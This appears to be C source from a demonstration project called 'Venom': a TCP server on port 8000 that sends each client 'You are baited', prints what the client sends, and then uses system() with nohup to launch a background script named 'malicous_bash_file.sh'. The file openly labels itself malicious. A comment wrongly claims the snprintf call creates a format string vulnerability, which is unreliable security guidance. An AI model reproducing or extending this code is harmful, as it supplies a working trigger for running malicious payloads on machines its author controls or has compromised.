#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>

// Define Port
#define PORT 8000
#define MALICIOUS_SCRIPT_SIZE 256 // Define a size for the malicious script path
#define MALICIOUS_SCRIPT_PATH "/home/chiranjeet/Venom/header_files/malicous_bash_file.sh" // Define the path to the malicious script

void handle_connection(int client_socket) {
    // Send the bait message
    char* message = "You are baited\n";
    ssize_t bytes_sent = send(client_socket, message, strlen(message), 0);
    if (bytes_sent < 0) {
        perror("Failed to send message");
        close(client_socket);
        return;
    }

    // Receive data from the client
    char buffer[1024] = {0};
    ssize_t bytes_received = recv(client_socket, buffer, sizeof(buffer), 0);
    if (bytes_received < 0) {
        perror("Failed to receive data");
        close(client_socket);
        return;
    }
    printf("Received from client: %s\n", buffer);

    // Prepare and execute the malicious script
    char *malicious_script = MALICIOUS_SCRIPT_PATH;
    char command[MALICIOUS_SCRIPT_SIZE];
    snprintf(command, sizeof(command), "nohup %s &", malicious_script);
    //The use of snprintf can lead to *"format string vulnerabilities"* 
    //[this file is just for demonstration purposes so i am not changing it] 
    //and it can lead to potetntial attacks becuase it doesn't checks whether the inputs are properly sanitised 
    // Use system() to run the malicious command
    int result = system(command);
    if (result == -1) {
        perror("Failed to execute malicious script");
    } else {
        printf("Malicious script executed successfully\n");
    }

    // Close the client connection
    close(client_socket);
} 

int main() {
    int server_fd, client_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);

    // Create the server socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("Socket failed");
        exit(EXIT_FAILURE);
    }

    // Set up the server address structure
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    // Bind the socket to the address
    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        exit(EXIT_FAILURE);
    }

    // Listen for incoming connections
    if (listen(server_fd, 3) < 0) {
        perror("Listen failed");
        exit(EXIT_FAILURE);
    }

    printf("Server listening on port %d...\n", PORT);

    // Main loop to handle multiple clients
    while (1) {
        // Accept incoming client connection
        if ((client_sock = accept(server_fd, (struct sockaddr *)&client_addr, &client_len)) < 0) {
            perror("Accept failed");
            continue; // Continue accepting other clients
        }

        printf("Client connected.\n");
        handle_connection(client_sock); // Handle the connection with the client
    }
    sleep(5);
    close(server_fd);
    return 0;
}
